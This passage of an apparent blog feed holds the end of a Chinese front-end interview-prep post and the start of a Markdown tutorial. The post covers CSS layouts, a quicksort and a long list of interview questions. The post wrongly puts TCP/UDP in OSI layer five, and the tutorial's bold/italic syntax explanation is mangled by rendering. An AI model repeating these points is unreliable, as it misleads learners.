class="name">div</span>></span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.left</span>{</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    margin-right: 20px;    //形成20px的间隔</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.right</span>{</span><br><span class="line">    overflow: hidden; //通过设置overflow: hidden来触发BFC特性</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个方法主要是应用到BFC的一个特性：</p><ul><li>浮动元素的块状兄弟元素会无视浮动元素的位置，尽量占满一整行，这样该兄弟元素就会被浮动元素覆盖。</li><li>若浮动元素的块状兄弟元素为BFC，则不会占满一整行，而是根据浮动元素的宽度，占据该行剩下的宽度，避免与浮动元素重叠。</li><li>浮动元素与其块状BFC兄弟元素之间的margin可以生效，这将继续减少兄弟元素的宽度。<br>并不是一定要在.right上用overflow: hidden;，只要能触发BFC就好了，另外在IE6上也可以触发haslayout特性（推荐用*zoom: 1;）。</li></ul><p>table布局<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>left<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">    <span class="tag"></<span class="name">div</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">    <span class="tag"></<span class="name">div</span>></span></span><br><span class="line"><span class="tag"></<span class="name">div</span>></span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>{</span><br><span class="line">    <span class="attribute">display</span>: table; <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">table-layout</span>: fixed;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.left</span>,<span class="selector-class">.right</span>{</span><br><span class="line">    <span class="attribute">display</span>: table-cell;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.left</span>{</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">padding-right</span>: <span class="number">20px</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个方法是表格布局的典型运用。说真的，我也很迷惘要不要使用表格布局，毕竟已经是上个时代的产物了，虽然已经不再用的HTML结构了，但用上相应的CSS其实思路跟以前是变化不大的。<table></table></p><p>这个方法主要是利用了表格(table)的宽度必然等于其所有单元格(table-cell)加起来的总宽度，那么只要表格的宽度一定，其中一个（或几个）单元格的宽度也一定，那么另外一个未设置宽度的单元格则会默认占满剩下的宽度，即实现自适应。</p><p>flex</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>left<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">    <span class="tag"></<span class="name">div</span>></span></span><br><span class="line">    <span class="tag"><<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">        <span class="tag"><<span class="name">p</span>></span>right<span class="tag"></<span class="name">p</span>></span></span><br><span class="line">    <span class="tag"></<span class="name">div</span>></span></span><br><span class="line"><span class="tag"></<span class="name">div</span>></span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>{</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.left</span>{</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">20px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.right</span>{</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.left</span> <span class="selector-tag">p</span>{<span class="attribute">width</span>: <span class="number">200px</span>;}</span><br></pre></td></tr></tbody></table></figure><p>flex布局的自适应我就不多说了，本来就是设计来自适应的，只需要用上flex: 1;，就能让.right分到.parent的宽度减去.left的宽度</p><p>8、unix中常用的命令行</p><p>ls,pwd,ls,vim,cd,cp,rm,chmod</p><p>9、OSI模型，HTTP,TCP,UDP分别在哪些层</p><p><img src="https://gss0.bdstatic.com/-4o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=498033e303087bf469e15fbb93ba3c49/77c6a7efce1b9d16a9ef96c9f2deb48f8c546469.jpg" alt="image"></p><ul><li>http在第7层应用层</li><li>TCP／UDP在第五层传输层</li></ul><p>10、解释平衡二叉树，以及在数据结构中的应用（红黑树）</p><p>11、快排的时间复杂度和空间复杂度</p><p>递归法<br></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *x, <span class="keyword">int</span> *y)</span> </span>{</span><br><span class="line"><span class="keyword">int</span> t = *x;</span><br><span class="line">*x = *y;</span><br><span class="line">*y = t;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort_recursive</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>{</span><br><span class="line"><span class="keyword">if</span> (start >= end)</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//這是為了防止宣告堆疊陣列時當機</span></span><br><span class="line"><span class="keyword">int</span> mid = arr[end];</span><br><span class="line"><span class="keyword">int</span> left = start, right = end - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (left < right) {</span><br><span class="line"><span class="keyword">while</span> (arr[left] < mid && left < right)</span><br><span class="line">left++;</span><br><span class="line"><span class="keyword">while</span> (arr[right] >= mid && left < right)</span><br><span class="line">right--;</span><br><span class="line">swap(&arr[left], &arr[right]);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (arr[left] >= arr[end])</span><br><span class="line">swap(&arr[left], &arr[end]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">left++;</span><br><span class="line">    <span class="keyword">if</span> (left) {</span><br><span class="line">        quick_sort_recursive(arr, start, left - <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    quick_sort_recursive(arr, left + <span class="number">1</span>, end);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span> </span>{</span><br><span class="line">quick_sort_recursive(arr, <span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>时间复杂度O(nlogn)    空间复杂度O(logn)</p><p>12、手写一个jQuery插件</p><p>13、在jquery方法和原型上面添加方法的区别和实现，以及jquery对象的实现</p><p>14、手写一个递归函数</p><p>15、对前端路由的理解？前后端路由的区别？</p><p>16、介绍一下webpack和gulp，以及项目中具体的使用</p><p>17、你对es6的了解</p><p>18、解释一下vue和react，以及异同点</p><p>19、关于平衡二叉树</p><p>20、前后端分离的意义以及对前端工程化的理解</p><p>21、使用css实现一个三角形</p><p>22、用promise手写ajax</p><p>23、手写一个类的继承，并解释一下</p><p>24、解释一下call函数和apply函数的作用，以及用法</p><p>25、你说自己抗压能力强，具体表现在哪里？</p><p>26、对前端前景的展望，以后前端会怎么发展</p><p>27、手写第一次面试没有写出来的链表问题，要求用es6写</p><p>28、平时是怎么学技术的？</p><p>29、平时大学里面时间是怎么规划的？</p><p>30、接下来有什么计划？这个学期和下个学期的计划是？</p><p>31、项目中遇到的难点，或者你学习路上的难点</p><p>32、你是通过什么方法和途径来学习前端的</p><p>33、手写一个简单遍历算法</p><p>34、解释一下react和vue，以及区别</p><p>35、你在团队中更倾向于什么角色？</p><p>36、对java的理解</p><p>37、介绍node.js，并且介绍你用它做的项目</p><p>38、手写一个js的深克隆</p><p>39、for函数里面setTimeout异步问题</p><p>40、手写归并排序</p><p>41、介绍自己的项目</p><p>42、实现两个数组的排序合并</p><p>43、手写一个原生ajax</p><p>44、手写一个promise版的ajax</p><p>45、手写实现一个promise</p><p>46、手写实现requireJS模块实现</p><p>47、手写实现jquery里面的insertAfter</p><p>48、react和vue的介绍以及异同</p><p>49、AMD和CMD，commonJS的区别</p><p>50、介绍一下backbone</p><p>51、了解过SEO吗？</p><p>52、低版本浏览器不支持HTML5标签怎么解决？</p><p>53、用js使低版本浏览器支持HTML5标签 底层是怎么实现的？</p><p>54、实现一个布局：左边固定宽度为200，右边自适应，而且滚动条要自动选择只出现最高的那个</p><p>55、画出盒子模型，要使谷歌浏览器的盒子模型显示得跟IE浏览器一致（让谷歌跟ie一致，不是ie跟谷歌一致），该怎么做？</p><p>56、手写JS实现类继承，讲原型链原理，并解释new一个对象的过程都发生了什么</p><p>57、Array对象自带的方法，一一列举</p><p>58、若干个数字，怎么选出最大的五个</p><p>59、Array对象自带的排序函数底层是怎么实现的？</p><p>60、常用的排序算法有哪些，介绍一下选择排序</p><p>61、了解navigator对象吗？</p><p>62、手写一个正则表达式，验证邮箱</p><p>63、link和@import引入CSS的区别？</p><p>64、刚才说有些浏览器不兼容@import，具体指哪些浏览器？</p><p>65、介绍一下cookie,localstorage,sessionstorage,session</p><p>66、jquery绑定click的方法有几种</p><p>67、你的优点/竞争力</p><p>68、移动端适配问题</p><p>69、react的难点在哪里</p><p>70、做过css动画吗</p><p>71、如何优化网站</p><p>72、以后的规划</p><p>73、你做过最困难的事情是啥？</p><p>74、css3 html5新特性</p><p>75、闭包，ES6，跨域</p><p>76、问做过啥项目，用到什么技术，遇到什么困难</p><p>77、兼容性</p><p>78、盒子模型</p><p>79、Array的unshift() method的作用是什么？如何连接两个Array？如何在Array里移除一个元素？</p><p>80、用纸笔写一个Closure，任意形式和内容</p><p>81、知不知道Array-like Object？</p><p>82、如何用Native JavaScript来读写Cookie？</p><p>83、知不知道CSS Box-model？</p><p>84、如何做一个AJAX Request？</p><p>85、Cross-domain access有没有了解？</p><p>86、前端安全方面有没有了解？XSS和CSRF如何攻防？</p><p>87、HTTP Response的Header里面都有些啥？</p><p>88、知不知道HTTP2？</p><p>89、输入URL后发生了什么？</p><p>90、new operator实际上做了什么？</p><p>91、面向对象的属性有哪些？</p><p>92、做一个两栏布局，左边fixed width，右边responsive，用纸笔手写</p><p>93、讲一下AJAX Request</p><p>94、讲一下Cross-domain access</p><p>95、介绍一下做过的项目</p><p>96、问到了多个服务器怎么弄，架构之类的</p><p>97、angular的渲染流程</p><p>98、脏检查</p><p>99、nodejs的架构、优缺点、回调</p><p>100、css 盒模型</p><p>101、css 布局，左边定宽右边自适应</p><p>102、冒泡和捕获，事件流哪三个阶段？</p><p>103、实现事件代理</p><p>104、原型链</p><p>105、继承的两种方法</p><p>106、ajax，原生ajax的四个过程</p><p>107、闭包，简单说一个闭包的应用，然后闭包的主要作用是什么</p><p>108、css:两个块状元素上下的margin-top和margin-bottom会重叠。啥原因？怎么解决？</p><p>109、js：写一个递归。就是每隔5秒调用一个自身，一共100次</p><p>110、cookie和session有什么区别</p><p>111、网络分层结构</p><p>112、你的不足是什么？</p><p>113、做了那么多项目，有没有自己的归纳总结</p><p>114、工程怎么进行文件管理</p><p>115、less和sass掌握程度</p><p>116、Cookie 是否会被覆盖，localStorage是否会被覆盖</p><p>117、事件代理js实现</p><p>118、Css实现动画效果</p><p>119、Animation还有哪些其他属性</p><p>120、Css实现三列布局</p><p>121、Css实现保持长宽比1:1</p><p>122、Css实现两个自适应等宽元素中间空10个像素</p><p>123、requireJS的原理是什么</p><p>124、如何保持登录状态</p><p>125、浮动的原理以及如何清除浮动</p><p>126、Html的语义化</p><p>127、原生js添加class怎么添加，如果本身已经有class了，会不会覆盖，怎么保留？</p><p>128、Jsonp的原理。怎么去读取一个script里面的数据？</p><p>129、如果页面初始载入的时候把ajax请求返回的数据存在localStorage里面，然后每次调用的时候去localStorage里面取数，是否可行。</p><p>130、304是什么意思？有没有方法不请求不经过服务器直接使用缓存</p><p>131、http请求头有哪些字段</p><p>132、数组去除一个函数。用arr.splice。又问splice返回了什么？应该返回的是去除的元素。</p><p>133、js异步的方法（promise，generator，async）</p><p>134、Cookie跨域请求能不能带上</p><p>一般是不会带上的，要设置xhr.withCredentials = true;目标服务器要设置<br>Access-Control-Allow-Credentials，Access-Control-Allow-Origin</p><p>135、最近看什么开源项目？</p><p>136、commonJS和AMD</p><p>137、平时是怎么学习的？</p><p>138、为什么要用translate3d？</p><p>139、对象中key-value的value怎么再放一个对象？</p><p>140、Get和post的区别？</p><p>145、Post一个file的时候file放在哪的？</p><p>146、说说你对组件的理解</p><p>147、组件的html怎么进行管理</p><p>148、js的异步加载，promise的三种状态，ES7中的async用过么</p><p>149、静态属性怎么继承</p><p>150、js原型链的继承</p><p>151、jquery和zepto有什么区别</p><p>152、angular的双向绑定原理</p><p>153、angular和react的认识</p><p>154、MVVM是什么</p><p>155、移动端是指手机浏览器，还是native，还是hybrid</p><p>156、你用了移动端的什么库类和框架？</p><p>157、移动端要注意哪些？</p><p>158、适配有去考虑么，retina屏幕啊？</p><p>159、rem是什么？em是什么？如果上一层就是根root了，em和rem等价么？</p><p>160、怎么测试的？会自动化测试么？</p><p>161、你觉得你什么技术最擅长？</p><p>162、你平时有没有什么技术的沉淀？</p><p>163、单向链表怎么查找有没有环？</p><p>164、怎么得到一个页面的a标签？</p><p>165、怎么在页面里放置一个很简单的图标，不能用img和background-img？</p><p>166、正则表达式判断url</p><p>167、怎么去除字符串前后的空格</p><p>168、实现页面的局部刷新</p><p>169、绝对定位与相对定位的区别</p><p>170、js轮播实现思路</p><p>171、使用js画一个抛物线，抛物线上有个小球随着抛物线运动，有两个按钮能使小球继续运动停止运动</p><p>172、java五子棋，说下实现思路</p><p>173、如何让各种情况下的div居中(绝对定位的div,垂直居中,水平居中)？</p><p>174、display有哪些值？说明他们的作用</p><p>175、css定义的权重</p><p>176、requirejs实现原理</p><p>177、requirejs怎么防止重复加载</p><p>178、ES6里头的箭头函数的this对象与其他的有啥区别</p><p>179、tcp/udp区别</p><p>180、tcp三次握手过程</p><p>181、xss与csrf的原理与怎么防范</p><p>182、mysql与 MongoDB的区别</p><p>183、w3c事件与IE事件的区别</p><p>184、有没有上传过些什么npm模块</p><p>185、IE与W3C怎么阻止事件的冒泡</p><p>186、gulp底层实现原理</p><p>187、webpack底层实现原理</p><p>188、gulp与webpack区别</p><p>189、vuejs与angularjs的区别</p><p>190、vuex是用来做什么的</p><p>191、说下你知道的响应状态码</p><p>192、ajax的过程以及 readyState几个状态的含义</p><p>193、你除了前端之外还会些什么？</p><p>194、cookie与session的区别</p><p>195、一些关于php与java的问题</p><p>196、你觉得你哪个项目是你做的最好的</p><p>197、说说你在项目中遇到了哪些困难,是怎么解决的</p><p>198、前端优化你知道哪些</p><p>199、webpack是用来干嘛的</p><p>200、webpack与gulp的区别</p><p>201、es6与es7了解多少</p><p>202、说下你知道的响应状态码</p><p>203、看过哪些框架的源码</p><p>204、遇到过哪些浏览器兼容性问题</p><p>205、清除浮动有哪几种方式,分别说说</p><p>206、你知道有哪些跨域方式,分别说说</p><p>207、JavaScript有哪几种类型的值</p><p>208、使用 new操作符时具体是干了些什么</p><p>209、学习前端的方法以及途径</p><p>210、怎么实现两个大整数的相乘，说下思路</p><p>211、你学过数据结构没,说说你都了解些什么</p><p>212、你学过计算机操作系统没,说说你都了解些什么</p><p>213、你学过计算机组成原理没,说说你都了解些什么</p><p>214、你学过算法没,说说你都了解些什么</p><p>215、说下选择排序,冒泡排序的实现思路</p><p>216、用过哪些框架</p><p>217、让你设计一个前端css框架你怎么做</p><p>218、了解哪些设计模式说说看</p><p>219、说下你所了解的设计模式的优点</p><p>220、vue源码结构</p><p>221、状态码</p><p>222、浏览器缓存的区别</p><p>223、304与200读取缓存的区别</p><p>224、http请求头有哪些,说说看你了解哪些</p><p>225、js中this的作用</p><p>226、js中上下文是什么</p><p>227、js有哪些函数能改变上下文</p><p>228、你所了解的跨域的方法都说说看你了解的？</p><p>229、要是让你自己写一个js框架你会用到哪些设计模式</p><p>230、平常在项目中用到过哪些设计模式,说说看</p><p>231、一来给了张纸要求写js自定义事件</p><p>232、前端跨域的方法</p><p>233、call与apply的区别</p><p>234、h5有个api能定位你知道是哪个吗？</p><p>235、vue与angularjs中双向数据绑定是怎样实现的？</p><p>236、webpack怎样配置？</p><p>237、nodejs中的文件怎么读写？</p><p>238、link和@import有什么区别？</p><p>239、cookies，sessionStorage 和 localStorage 的区别</p><p>240、看过哪些前端的书？平时是怎么学习的</p><p>241、说下你所理解的mvc与mvvc</p><p>242、position有哪些值,说下各自的作用</p><p>243、写个从几个li中取下标的闭包代码</p><p>244、你的职业规划是怎么样的？</p><p>245、移动端性能优化</p><p>246、lazyload如何实现</p><p>247、点透问题</p><p>248、前端安全</p><p>249、原生js模板引擎</p><p>250、repaint和reflow区别</p><p>251、requirejs如何避免循环依赖？</p><p>252、实现布局：左边一张图片，右边一段文字（不是环绕）</p><p>253、window.onload和$(document).ready()的区别，浏览器加载转圈结束时哪个时间点？</p><p>254、form表单当前页面无刷新提交 target iframe</p><p>255、setTimeout和setInterval区别，如何互相实现？</p><p>256、如何避免多重回调—promise，promise简单描述一下，如何在外部进行resolve()</p><p>257、margin坍塌？水平方向会不会坍塌？</p><p>258、伪类和伪元素区别</p><p>259、vue如何实现父子组件通信，以及非父子组件通信</p><p>260、数组去重</p><p>261、使用flex布局实现三等分，左右两个元素分别贴到左边和右边，垂直居中</p><p>262、平时如何学前端的，看了哪些书，关注了哪些公众号</p><p>263、实现bind函数</p><p>264、数组和链表区别，分别适合什么数据结构</p><p>265、对mvc的理解</p><p>266、描述一个印象最深的项目，在其中担任的角色，解决什么问题</p><p>267、http状态码。。。401和403区别？</p><p>268、描述下二分查找</p><p>269、为什么选择前端，如何学习的，看了哪些书，《js高级程序设计》和《你不知道的js》有什么区别，看书，看博客，看公众号三者的时间是如何分配的？</p><p>270、如何评价BAT？</p><p>271、描述下在实习中做过的一个项目，解决了什么问题，在其中担任了什么角色？这个过程存在什么问题，有什么值得改进的地方？</p><p>272、如何看待加班，如果有个项目需要连续一个月加班，你怎么看？</p><p>273、遇到的压力最大的一件事是什么？如何解决的？</p><p>274、平时有什么爱好</p><p>275、自身有待改进的地方</p><p>276、n长的数组放入n+1个数，不能重复，找出那个缺失的数</p><p>277、手里有什么offer</p><p>278、你对于第一份工作最看重的三个方面是什么？</p><p>279、如何评价现在的前端？</p><p>280、用原生js实现复选框选择以及全选非全选功能</p><p>281、用4个颜色给一个六面体上色有多少种情况</p><p>282、amd和cmd区别</p><p>283、为什么选择前端，移动端性能优化</p><p>284、vue的特点？双向数据绑定是如何实现的</p><p>285、Object.defineProperty</p><p>286、算法题：数组去重，去除重复两次以上的元素，代码题：嵌套的ul-li结构，根据input中输入的内容，去除相应的li节点，且如果某个嵌套的ul下面的li都被移除，则该ul的父li节点也要被移除</p><p>287、页面加载过程</p><p>288、浏览器如何实现图片缓存</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔试面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown入门_0</title>
      <link href="/2018/05/06/Markdown%E5%85%A5%E9%97%A8%E4%B9%8B0/"/>
      <url>/2018/05/06/Markdown%E5%85%A5%E9%97%A8%E4%B9%8B0/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Markdown——入门指南-补充版"><a href="#Markdown——入门指南-补充版" class="headerlink" title="Markdown——入门指南(补充版)"></a>Markdown——入门指南(补充版)</h2><h4 id="导语："><a href="#导语：" class="headerlink" title="导语："></a>导语：</h4><blockquote><p>Markdown 是一种轻量级的「标记语言」，它的优点很多，目前也被越来越多的写作爱好者，撰稿者广泛使用。看到这里请不要被「标记」、「语言」所迷惑，Markdown 的语法十分简单。常用的标记符号也不超过十个，这种相对于更为复杂的 HTML 标记语言来说，Markdown 可谓是十分轻量的，学习成本也不需要太多，且一旦熟悉这种语法规则，会有一劳永逸的效果。</p></blockquote><h3 id="一，认识-Markdown"><a href="#一，认识-Markdown" class="headerlink" title="一，认识 Markdown"></a>一，认识 Markdown</h3><hr><p>在刚才的导语里提到，Markdown 是一种用来写作的轻量级「标记语言」，它用简洁的语法代替排版，而不像一般我们用的字处理软件 Word 或 Pages 有大量的排版、字体设置。它使我们专心于码字，用「标记」语法，来代替常见的排版格式。例如此文从内容到格式，甚至插图，键盘就可以通通搞定了。目前来看，支持 Markdown 语法的编辑器有很多，包括很多网站（例如简书）也支持了 Markdown 的文字录入。Markdown 从写作到完成，导出格式随心所欲，你可以导出 HTML 格式的文件用来网站发布，也可以十分方便的导出 PDF 格式，这种格式写出的简历更能得到 HR 的好感。甚至可以利用 CloudApp 这种云服务工具直接上传至网页用来分享你的文章，全球最大的轻博客平台 Tumblr，也支持 Mou 这类 Markdown 工具的直接上传。</p><h3 id="Markdown-官方文档"><a href="#Markdown-官方文档" class="headerlink" title="Markdown 官方文档"></a>Markdown 官方文档</h3><p>这里可以看到官方的 Markdown 语法规则文档，当然，后文我也会用自己的方式阐述这些语法的具体用法。</p><blockquote><p>创始人 John Gruber 的 Markdown 语法说明<br>Markdown 中文版语法说明</p></blockquote><h3 id="使用-Markdown-的优点"><a href="#使用-Markdown-的优点" class="headerlink" title="使用 Markdown 的优点"></a>使用 Markdown 的优点</h3><p>专注你的文字内容而不是排版样式，安心写作。<br>轻松的导出 HTML、PDF 和本身的 .md 文件。<br>纯文本内容，兼容所有的文本编辑器与字处理软件。<br>随时修改你的文章版本，不必像字处理软件生成若干文件版本导致混乱。<br>可读、直观、学习成本低。</p><h3 id="使用-Markdown-的误区"><a href="#使用-Markdown-的误区" class="headerlink" title="使用 Markdown 的误区"></a>使用 Markdown 的误区</h3><p>We believe that writing is about content, about what you want to say – not about fancy formatting.<br>我们坚信写作写的是内容，所思所想，而不是花样格式。<br>— Ulysses for Mac<br>Markdown 旨在简洁、高效，也由于 Markdown 的易读易写，人们用不同的编程语言实现了多个版本的解析器和生成器，这就导致了目前不同的 Markdown 工具集成了不同的功能（基础功能大致相同），例如流程图与时序图，复杂表格与复杂公式的呈现，虽然功能的丰富并没有什么本质的缺点，但终归有些背离初衷，何况在编写的过程中很费神，不如使用专业的工具撰写来的更有效率，所以如果你需实现复杂功能，专业的图形界面工具会更加方便。当然，如果你对折腾这些不同客户端对 Markdown 的定制所带来高阶功能感到愉悦的话，那也是无可厚非的。</p><h3 id="我该用什么工具？"><a href="#我该用什么工具？" class="headerlink" title="我该用什么工具？"></a>我该用什么工具？</h3><p>Mou for Mac<br>Mou for Mac<br>在 Mac OS X 上，我强烈建议你用 Mou 这款免费且十分好用的 Markdown 编辑器，它支持实时预览，既左边是你编辑 Markdown 语言，右边会实时的生成预览效果。不仅如此，Mou 还有一些有趣的偏好设置（Preference），例如主题（Themes）与样式（CSS），它们可以配置出定制化的文本编辑效果与导出效果，如果你对自带的主题与样式不满意还可以到 GitHub 上搜索其它爱好者为 Mou 编写的更多主题样式，导入的方式可以在偏好设置的 Themes 或 CSS 选项中 选择 reload。</p><p>如果你从事文字工作，我强烈建议你购买 Ulysses for Mac，这款软件入围了苹果 Mac App Store 的 The Best of 2013。它支持更多的写作格式、多文档的支持。Mou，iA writer 这些软件都是基于单文档的管理方式，而 Ulysses 支持 Folder、Filter 的管理，一个 Folder 里面可以创建多个 Sheet，Sheet 之间也可以进行 Combine 处理。</p><p>Mac 上一些 Markdown 编辑器<br>Mac 上一些 Markdown 编辑器<br>由于笔者很少接触 Windows，Windows 下的 Markdown 没有过多涉猎，经朋友介绍，有两款还算不错，一款叫做 MarkdownPad ，另一款叫做 MarkPad。</p><p>iOS 端很多 app 早已经支持了 Markdown 录入，例如 Drafts，Day One，iA writer 等，另外 Ulysses for iPad 现在已经上架，可以说是 iOS 平台最好的编辑器了。</p><p>在 Web端，我强烈推荐简书这款产品，上面有无数热爱文字的人在不停的创造，分享。在 Web 端使用 Markdown 没有比简书更舒服的地方了，同样支持左右两栏的实时预览，字体优雅，简洁。</p><p>简书的编辑预览模式<br>简书的编辑预览模式</p><h3 id="二，Markdown-语法的简要规则"><a href="#二，Markdown-语法的简要规则" class="headerlink" title="二，Markdown 语法的简要规则"></a>二，Markdown 语法的简要规则</h3><p>标题是每篇文章都需要也是最常用的格式，在 Markdown 中，如果一段文字被定义为标题，只要在这段文字前加 # 号即可。</p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p>以此类推，总共六级标题，建议在井号后加一个空格，这是最标准的 Markdown 语法。<br>补充：除了在前段加上“＃”还可以是在底部加上“＝”</p><h1 id="一级标题-1"><a href="#一级标题-1" class="headerlink" title="一级标题"></a>一级标题</h1><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>熟悉 HTML 的同学肯定知道有序列表与无序列表的区别，在 Markdown 下，列表的显示只需要在文字前加上 - 或 * 即可变为无序列表，有序列表则直接在文字前加1. 2. 3. 符号要和文字之间加上一个字符的空格。<br>无序列表与有序列表</p><h5 id="无序列表："><a href="#无序列表：" class="headerlink" title="无序列表："></a>无序列表：</h5><ul><li>1</li><li>2</li><li>3</li></ul><p>补充：无序列表出了加上“＊”还可以是“＋”或者“－”<br>无序列表的第二个示例(建议：一个文档中只是用一种无序列表的表示方式）</p><ul><li>1</li></ul><ul><li>2</li><li>3</li></ul><h5 id="有序列表："><a href="#有序列表：" class="headerlink" title="有序列表："></a>有序列表：</h5><ol><li>1</li><li>2</li><li>3</li></ol><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>如果你需要引用一小段别处的句子，那么就要用引用的格式。</p><p>例如这样<br>只需要在文本前加入 > 这种尖括号（大于号）即可</p><blockquote><p>这里是引用</p></blockquote><h3 id="图片与链接"><a href="#图片与链接" class="headerlink" title="图片与链接"></a>图片与链接</h3><p>插入链接与插入图片的语法很像，区别在一个 !号</p><p>图片为：<img src="图片地址" alt="文字"></p><p>链接为：<a href="链接地址">文字</a></p><p>插入图片的地址需要图床，这里推荐围脖图床修复计划 与 CloudApp 的服务，生成URL地址即可。</p><h3 id="粗体与斜体"><a href="#粗体与斜体" class="headerlink" title="粗体与斜体"></a>粗体与斜体</h3><p>Markdown 的粗体和斜体也非常简单，用两个 <em> 包含一段文本就是粗体的语法，用一个 </em> 包含一段文本就是斜体的语法。</p><p>斜体示例：<em>这里是斜体</em></p><h4 id="补充：当然也可以加下划线“-”"><a href="#补充：当然也可以加下划线“-”" class="headerlink" title="补充：当然也可以加下划线“_”"></a>补充：当然也可以加下划线“_”</h4><p>斜体示例：<em>这里也是斜体</em></p><h4 id="补充：当然从斜体我们也能思考得出加粗的另一种示例"><a 